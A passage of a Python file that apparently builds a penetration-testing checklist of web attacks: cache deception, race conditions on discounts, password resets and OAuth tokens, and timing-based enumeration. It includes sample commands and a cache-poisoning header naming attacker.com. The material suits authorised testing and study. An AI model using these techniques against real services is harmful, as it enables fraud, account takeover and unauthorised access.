                                'notes': 'CSPT = Client-Side Path Traversal. SPA vulnerable if: const url = baseUrl + userInput (no sanitization). Combined with cache deception: 1) Victim SPA issues authenticated request to traversed path ending in .css 2) CDN caches as static asset (ignores auth headers in cache key) 3) Attacker retrieves cached secret. Real bug: API endpoint /v1/token (no-cache) but /v1/token.css cached publicly. See: zere.es/posts/cache-deception-cspt-account-takeover/'
                            }
                        }
                    ]
                }
            ]
        })

        # SECTION 4: Race Conditions
        tasks['children'].append({
            'id': f'race-conditions-{port}',
            'name': 'Race Condition Attacks',
            'type': 'parent',
            'children': [
                {
                    'id': f'race-limit-overrun-{port}',
                    'name': 'Limit Overrun / TOCTOU',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Burp Repeater: Send group in parallel (20x same request)',
                        'description': 'Race condition to bypass limits (discount codes, gift cards, voting, rate limits)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTOMATED'],
                        'flag_explanations': {
                            'Burp Repeater': 'Create request group with 20+ identical requests',
                            'Send group in parallel': 'HTTP/2 single-packet attack (simultaneous arrival)',
                            'TOCTOU': 'Time-of-check to time-of-use race window'
                        },
                        'success_indicators': [
                            'Multiple 200 OK responses (all requests succeeded)',
                            'Limit bypassed: discount applied 5x, gift card used 3x',
                            'Database shows duplicate entries',
                            'Account balance negative (withdrew more than limit)'
                        ],
                        'failure_indicators': [
                            'Only first request succeeds, rest fail',
                            '429 Too Many Requests',
                            'Database constraint violation (duplicate key error)',
                            'Timestamps in responses show sequential processing'
                        ],
                        'next_steps': [
                            'Test on: discount codes, gift cards, voting, CAPTCHA, rate limits',
                            'Try Turbo Intruder for >100 requests: race-single-packet-attack.py',
                            'Test HTTP/1.1 last-byte sync if HTTP/2 unavailable',
                            'Analyze timing: negative timestamps = true race (response before request sent)'
                        ],
                        'alternatives': [
                            'Turbo Intruder: race-single-packet-attack.py with gate=race1',
                            'Python asyncio: 20x concurrent POST with httpx.AsyncClient',
                            'Curl parallel: echo "POST /redeem..." | parallel -j20 curl',
                            'Manual: Burp → Create tab group → Send in parallel'
                        ],
                        'notes': 'Limit-overrun: exploit TOCTOU race in limit checks. Flow: Check balance → Deduct funds (race window). Attack: send 20x withdraw requests simultaneously before first deduction recorded. HTTP/2 single-packet attack: send headers, pause, send final bytes together (arrive <1ms apart). Turbo Intruder engine: BURP2 for HTTP/2, THREADED for HTTP/1.1. Test: gift cards, promo codes, anti-brute-force.'
                    }
                },
                {
                    'id': f'race-hidden-substates-{port}',
                    'name': 'Hidden Substates Race',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit brief unintended state between multi-step operations (email change, password reset)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'ADVANCED'],
                        'success_indicators': [
                            'Email verification token sent to old email during race',
                            'Password reset token leaked cross-user',
                            'Session created before 2FA enforced',
                            'Profile updated but validation skipped',
                            'Database shows inconsistent state (email changed, token not regenerated)'
                        ],
                        'failure_indicators': [
                            'Operations atomic (no race window)',
                            'Database transactions prevent inconsistency',
                            'Timing too tight (requires <1ms precision)'
                        ],
                        'next_steps': [
                            '1. Identify multi-step operations: change email, reset password, create user',
                            '2. Find hidden substates: token null before generated, session before 2FA',
                            '3. Race email change + verify old email (token sent to old email)',
                            '4. Race user creation + confirm with empty token (bypass email verification)',
                            '5. Race session creation + access protected resource (bypass 2FA)',
                            'Use single-packet attack for <1ms timing precision'
                        ],
                        'alternatives': [
                            'Burp Repeater: Group (change email + verify) → Send parallel',
                            'Turbo Intruder: 1x change email, 50x verify with empty token',
                            'Test OAuth: race authorization_code → generate multiple AT/RT pairs',
                            'Test session: race login + access (session set before 2FA enforced)'
                        ],
                        'notes': 'Hidden substates: brief windows where system is in unintended state during multi-step operations. Example 1: Change email (DB write email) → Generate token (DB write token) → Race window where token is null. Attack: change email + spam confirm with empty token. Example 2: Session created → Set enforce_mfa flag → Race window: session exists without 2FA. GitLab vulnerable: email change sent token to old email during race. PortSwigger labs: partial-construction, single-endpoint.'
                    }
                },
                {
                    'id': f'race-time-sensitive-{port}',
                    'name': 'Time-Sensitive Token Generation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Race password reset tokens if generated using timestamp (predictable)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'success_indicators': [
                            'Two simultaneous password reset requests generate identical tokens',
                            'Token appears to be timestamp-based (e.g., hash(email + timestamp))',
                            'Single-packet attack produces matching tokens',
                            'Can reset other user password with leaked token'
                        ],
                        'failure_indicators': [
                            'Tokens differ despite simultaneous requests',
                            'Token includes random component (not predictable)',
                            'Rate limiting prevents multiple requests'
                        ],
                        'next_steps': [
                            'Request 2+ password resets simultaneously (single-packet)',
                            'Compare tokens: identical = time-based vulnerability',
                            'If identical: reset victim1 + victim2 → get victim1 token → use for victim2',
                            'Test session tokens, CSRF tokens, email verification tokens'
                        ],
                        'alternatives': [
                            'Burp: Create group with 2x reset requests → Send parallel',
                            'Turbo Intruder: race 2x reset with gate=race1',
                            'curl parallel: reset user1 & reset user2 (backgrounded)'
                        ],
                        'notes': 'Weak token generation: hash(email + timestamp). If timestamp resolution low (e.g., seconds), simultaneous requests generate identical tokens. Attack: race reset for user1 + user2 → receive user1 token → use for user2 (same token). Fix: use cryptographically random tokens (uuid4, secrets.token_urlsafe). PortSwigger lab: time-sensitive-vulnerabilities.'
                    }
                },
                {
                    'id': f'race-oauth-persistence-{port}',
                    'name': 'OAuth2 Eternal Persistence',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Race OAuth authorization_code or refresh_token to generate multiple AT/RT pairs (persist even after revocation)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'ADVANCED'],
                        'success_indicators': [
                            'Single authorization_code generates multiple access_token + refresh_token pairs',
                            'Victim revokes app access → some RT still valid (not all revoked)',
                            'Race window: code exchanged for tokens before invalidation',
                            'Multiple API calls with different tokens succeed'
                        ],
                        'failure_indicators': [
                            'authorization_code single-use enforced',
                            'All tokens revoked simultaneously',
                            'Rate limiting on token endpoint'
                        ],
                        'next_steps': [
                            '1. User authorizes OAuth app → receive authorization_code',
                            '2. Race exchange code for tokens (50+ parallel requests)',
                            '3. Verify multiple AT/RT pairs generated',
                            '4. User revokes app → test if all RTs invalidated',
                            '5. If some RTs survive: eternal persistence achieved',
                            'Alternative: race refresh_token exchange for multiple new RTs'
                        ],
                        'alternatives': [
                            'Burp: 50x POST /oauth/token with same authorization_code',
                            'Turbo Intruder: race code exchange with gate=race1',
                            'Test refresh token race: 50x POST with same RT',
                            'Manual: Intercept OAuth flow → duplicate token request'
                        ],
                        'notes': 'OAuth race conditions: 1) authorization_code should be single-use but race window allows multiple exchanges. 2) refresh_token exchange should invalidate old RT but race generates multiple valid RTs. Attack: user authorizes app → race 50x token requests → get 10+ AT/RT pairs → user revokes app → 9 pairs still valid (only 1 revoked). Persistence: attacker retains access even after revocation. Test Google, GitHub, LinkedIn OAuth.'
                    }
                },
                {
                    'id': f'race-websockets-{port}',
                    'name': 'WebSocket Race Conditions',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Race conditions in WebSocket message handling (concurrent state manipulation)',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'success_indicators': [
                            'Multiple WebSocket connections send simultaneous messages',
                            'Server-side state corrupted (balance negative, duplicate actions)',
                            'Messages processed out of order or concurrently',
                            'Race bypasses validation (purchase with insufficient funds)'
                        ],
                        'failure_indicators': [
                            'Messages processed sequentially (no concurrency)',
                            'WebSocket rate limiting',
                            'Server locks state during message processing'
                        ],
                        'next_steps': [
                            'Use Burp WebSocket Turbo Intruder extension',
                            'Open 10+ WebSocket connections (different tabs)',
                            'Send 100+ messages simultaneously across connections',
                            'Test on: trading, gaming, chat (concurrent user actions)'
                        ],
                        'alternatives': [
                            'Burp: WebSocket Turbo Intruder → THREADED engine → RaceConditionExample.py',
                            'GitHub: https://github.com/redrays-io/WS_RaceCondition_PoC',
                            'Manual: Browser DevTools → Multiple tabs → Send msgs simultaneously',
                            'Python: websockets library with asyncio for concurrent sends'
                        ],
                        'notes': 'WebSocket race conditions: real-time protocols vulnerable to concurrent message handling. Attack: open 10 WS connections → send 100 "buy item" messages simultaneously → bypass balance check (TOCTOU). Burp WebSocket Turbo Intruder: spawn multiple connections, fire messages in parallel with THREADED engine. Test: gaming (duplicate item claims), trading (negative balance), chat (spam bypass). Reference: github.com/d0ge/WebSocketTurboIntruder'
                    }
                },
                {
                    'id': f'race-turbo-intruder-guide-{port}',
                    'name': 'Turbo Intruder Race Condition Guide',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Comprehensive guide to using Burp Turbo Intruder for race condition attacks',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM'],
                        'success_indicators': [
                            'Negative timestamps in Turbo Intruder output (true race achieved)',
                            'Multiple requests show same millisecond timestamp',
                            'Server responds before request fully sent (overlap)',
                            'Exploit succeeds: limit bypassed, hidden state exploited'
                        ],
                        'failure_indicators': [
                            'Positive timestamps (sequential processing)',
                            'Timestamps differ by >10ms (no race)',
                            'Connection timeouts, rate limiting'
                        ],
                        'next_steps': [
                            'HTTP/2: Use Engine.BURP2 for single-packet attack',
                            'HTTP/1.1: Use Engine.THREADED or last-byte sync',
                            'Gate system: engine.queue(req, gate="race1") → openGate("race1")',
                            'Connection warming: send ping or dummy requests first',
                            'Increase concurrency: 50-100 requests for reliable race',
                            'Check Turbo Intruder output for negative timestamps (proof of race)'
                        ],
                        'alternatives': [
                            'Burp Repeater: Create group → Send in parallel (simpler for 2-20 requests)',
                            'Python h2spacex: HTTP/2 single-packet script (github.com/BishopFox/h2c-smuggling)',
                            'Burp Extensions: Race Condition Detector',
                            'Manual: HTTP/1.1 last-byte sync (withhold final byte, send together)'
                        ],
                        'notes': 'Turbo Intruder engines: BURP2 (HTTP/2 single-packet), THREADED (HTTP/1.1 multi-threaded), BURP (HTTP/1.1 connection pool). Gate system: queue(req, gate="x") withholds request tail, openGate("x") flushes all together (<1ms). Negative timestamp = server responded before request fully sent (proof of true race). Connection warming: send harmless request before race to stabilize TCP connection. Example script: examples/race-single-packet-attack.py. Diagnostic: check timestamps in results table - negative = race achieved.'
                    }
                }
            ]
        })

        # SECTION 5: Timing Attacks
        tasks['children'].append({
            'id': f'timing-attacks-{port}',
            'name': 'Timing Attacks & Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'timing-hidden-params-{port}',
                    'name': 'Discover Hidden Parameters via Timing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use single-packet attack to detect hidden parameters by measuring response time differences (~5ms)',
                        'tags': ['OSCP:HIGH', 'RECON', 'ADVANCED'],
                        'success_indicators': [
                            '~5ms time difference when parameter/header present vs absent',
                            'Burp Param Miner reports timing-based discoveries',
                            'Parameter triggers server-side action (DNS lookup, log write, validation)',
                            'Consistent timing difference across multiple tests'
                        ],
                        'failure_indicators': [
                            'Network jitter > time difference (unreliable)',
                            'No consistent timing pattern',
                            'All responses take same time'
                        ],
                        'next_steps': [
                            'Use Param Miner "Guess headers" with timing analysis enabled',
                            'Test discovered parameters for injection vulnerabilities',
                            'Check if parameter triggers DNS lookup (blind SSRF)',
                            'Test if parameter logged (log poisoning opportunity)'
                        ],
                        'alternatives': [
                            'Burp: Param Miner → Guess headers → Enable timing analysis',
                            'Manual: Compare response times for {base_url}/?test=1 vs {base_url}/',
                            'ffuf -w params.txt -u {base_url}/?FUZZ=1 -mr "time:.*" (time-based)',
                            'Python: measure requests.get() time with/without param'
                        ],
                        'notes': 'Timing attack for parameter discovery: send requests with/without parameter, measure response time. ~5ms difference indicates parameter exists but hidden. Causes: DNS lookup triggered, log written, validation performed, database query. Requires single-packet attack to remove network jitter (HTTP/2 preferred). Burp Param Miner includes timing analysis mode. Reference: portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work'
                    }
                },
                {
                    'id': f'timing-scoped-ssrf-{port}',
                    'name': 'Detect Scoped SSRF via Timing',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Timing comparison: allowed domain vs blocked domain',
                        'description': 'Discover open proxies / SSRF by measuring time difference for allowed vs blocked domains',
                        'tags': ['OSCP:HIGH', 'SSRF', 'RECON'],
                        'flag_explanations': {
                            'Scoped SSRF': 'SSRF with allow-list (only specific domains accessible)',
                            'Timing difference': 'Allowed domain: normal response time. Blocked domain: timeout or quick rejection',
                            'Single-packet attack': 'Remove network jitter for accurate measurements'
                        },
                        'success_indicators': [
                            'Request to allowed.com: 200ms response time',
                            'Request to blocked.com: 5000ms timeout or 10ms rejection',
                            'Consistent timing difference indicates filtering',
                            'Can enumerate internal domains by timing (allowed = accessible)'
                        ],
                        'failure_indicators': [
                            'All domains return same response time',
                            'Network jitter > timing difference',
                            'No SSRF vulnerability present'
                        ],
                        'next_steps': [
                            'Enumerate allowed domains by timing (subdomain brute-force)',
                            'Access internal services via allowed domains (bypass firewall)',
                            'Test front-end impersonation: X-Forwarded-For with whitelisted IPs',
                            'Discover new internal subdomains only accessible via open proxy'
                        ],
                        'alternatives': [
                            'Burp: Intruder → Payload: domain list → Analyze response times',
                            'ffuf -w subdomains.txt -u {base_url}/?url=https://FUZZ.internal.com -ft 200',
                            'Python: compare requests.get(target, params={"url": domain}).elapsed.total_seconds()',
                            'Manual: Test {base_url}/?url=internal.com vs {base_url}/?url=blocked.com'
                        ],
                        'notes': 'Scoped SSRF timing attack: open proxy with allow-list. Timing reveals allowed domains (normal response) vs blocked domains (timeout/reject). Use single-packet attack for accuracy. Attack flow: 1) Test known domains → identify timing pattern 2) Brute-force subdomains → time-based discovery 3) Access internal services via allowed domains → bypass firewall. Front-end impersonation: proxy forwards X-Forwarded-For header → add whitelisted IP → access restricted internal domains. Reference: portswigger.net/research/listen-to-the-whispers (scoped SSRF section).'
                    }
                },
                {
                    'id': f'timing-username-enum-{port}',
                    'name': 'Username Enumeration via Timing',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Time comparison: valid username (slow - password check) vs invalid username (fast - early exit)',
                        'description': 'Enumerate valid usernames by measuring login response time differences',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'Timing side-channel': 'Valid username triggers password check (slow). Invalid username returns early (fast)',
                            'Response time difference': 'Valid: 200-500ms. Invalid: 10-50ms',
                            'Single-packet attack': 'Accurate timing measurement'
                        },
                        'success_indicators': [
                            'Valid username: 300ms response (password hash computed)',
                            'Invalid username: 20ms response (early return)',
                            'Consistent timing pattern across multiple tests',
                            'Can build list of valid usernames'
                        ],
                        'failure_indicators': [
                            'Constant time response (secure implementation)',
                            'Network jitter > timing difference',
                            'Rate limiting triggered'
                        ],
                        'next_steps': [
                            'Build valid username list for password brute-force',
                            'Test password reset timing (valid user = email sent = slow)',
                            'Test registration timing (existing user = check = slow)',
                            'Combine with password spraying on valid usernames'
                        ],
                        'alternatives': [
                            'Burp Intruder: Payload=usernames → Analyze response times',
                            'Hydra with timing analysis (not all versions support)',
                            'Python: measure login POST for each username',
                            'Manual: Test admin vs random123 and compare times'
                        ],
                        'notes': 'Timing-based username enumeration: login flow for invalid username exits early (username not found), valid username continues to password check (bcrypt/PBKDF2 computation). Time difference: 100-500ms. Requires single-packet attack or multiple samples. Secure implementation: constant-time comparison or dummy password hash on invalid username. Also test: password reset (email sent = slow), registration (user exists check), account recovery.'
                    }
                }
            ]
        })

        # SECTION 6: Tools & Automation
        tasks['children'].append({
            'id': f'cache-timing-tools-{port}',
            'name': 'Automated Testing Tools',
            'type': 'parent',
            'children': [
                {
                    'id': f'tool-param-miner-{port}',
                    'name': 'Burp Param Miner (Cache Headers & Timing)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Automated discovery of unkeyed headers, hidden parameters, and cache inconsistencies',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM'],
                        'alternatives': [
                            'Burp: Extensions → BApp Store → Param Miner → Install',
                            'Right-click request → Extensions → Param Miner → Guess headers',
                            'Configure: Enable timing analysis, add custom wordlists',
                            'Results: Check Extender → Param Miner → Output for discoveries'
                        ],
                        'success_indicators': [
                            'Unkeyed header discovered: X-Forwarded-Host',
                            'Hidden parameter found: debug=1',
                            'Cache inconsistency detected',
                            'Timing-based parameter discovery'
                        ],
                        'next_steps': [
                            'Test discovered unkeyed headers for cache poisoning',
                            'Analyze hidden parameters for injection vulnerabilities',
                            'Export results and test manually in Repeater'
                        ],
                        'notes': 'Param Miner: Burp extension for automated discovery. Features: 1) Guess headers (X-Forwarded-*, X-Original-URL, etc) 2) Guess parameters (GET/POST params) 3) Cache key analysis (identifies unkeyed inputs) 4) Timing analysis (5ms difference detection). Install: Extender → BApp Store → Param Miner. Now includes timing attack mode from PortSwigger research.'
                    }
                },
                {
                    'id': f'tool-toxicache-{port}',
                    'name': 'Toxicache Scanner',
                    'type': 'command',
                    'metadata': {
                        'command': f'toxicache -u {base_url}/ -H "X-Forwarded-Host: attacker.com" -v',
                        'description': 'Automated cache poisoning scanner testing multiple injection techniques',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'flag_explanations': {
                            '-u': 'Target URL',
                            '-H': 'Custom header for poisoning test',
                            '-v': 'Verbose output'
                        },
                        'success_indicators': [
                            'Cache poisoning vulnerability detected',
                            'Unkeyed header injection successful',
                            'XSS payload reflected in cached response'
                        ],
                        'failure_indicators': [
                            'No vulnerabilities found',
                            'All headers keyed',
                            'Errors connecting to target'
                        ],
                        'next_steps': [
                            'Test reported vulnerabilities manually',
                            'Expand wordlists for more coverage',
                            'Test on different endpoints'
                        ],
                        'alternatives': [
                            'Manual Burp testing',
                            'Web Cache Vulnerability Scanner (wcvs)',
                            'Custom Python scripts'
                        ],
                        'notes': 'Toxicache: Golang scanner for cache poisoning. Tests: header injection, parameter cloaking, fat GET, delimiter tricks. Install: go install github.com/xhzeem/toxicache@latest. Alternative: wcvs (Web Cache Vulnerability Scanner) - wcvs -u example.com (highly customizable).'
                    }
                },
                {
                    'id': f'tool-turbo-intruder-{port}',
                    'name': 'Turbo Intruder (Race Conditions)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Burp extension for advanced race condition attacks (HTTP/2 single-packet)',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'EXPLOIT'],
                        'alternatives': [
                            'Burp: Extensions → BApp Store → Turbo Intruder → Install',
                            'Right-click request → Extensions → Turbo Intruder → Send to turbo intruder',
                            'Select script: examples/race-single-packet-attack.py',
                            'Replace %s with attack point, configure gate system',
                            'Execute and analyze results (check for negative timestamps)'
                        ],
                        'success_indicators': [
                            'Negative timestamps in output (race achieved)',
                            'Multiple successful responses to limited action',
                            'Limit bypassed (discount code used 10x)'
                        ],
                        'next_steps': [
                            'Tune concurrency and connection count',
                            'Test on different endpoints',
                            'Use custom scripts for multi-endpoint races'
                        ],
                        'notes': 'Turbo Intruder: High-performance Burp extension for race conditions. Scripts: race-single-packet-attack.py (HTTP/2), examples/ directory. Gate system: hold request tails, release simultaneously. Engines: BURP2 (HTTP/2), THREADED (HTTP/1.1), BURP (connection pool). Install: Extender → BApp Store. Usage: Send to turbo intruder → Select script → Execute.'
                    }
                }
            ]
        })

        return tasks
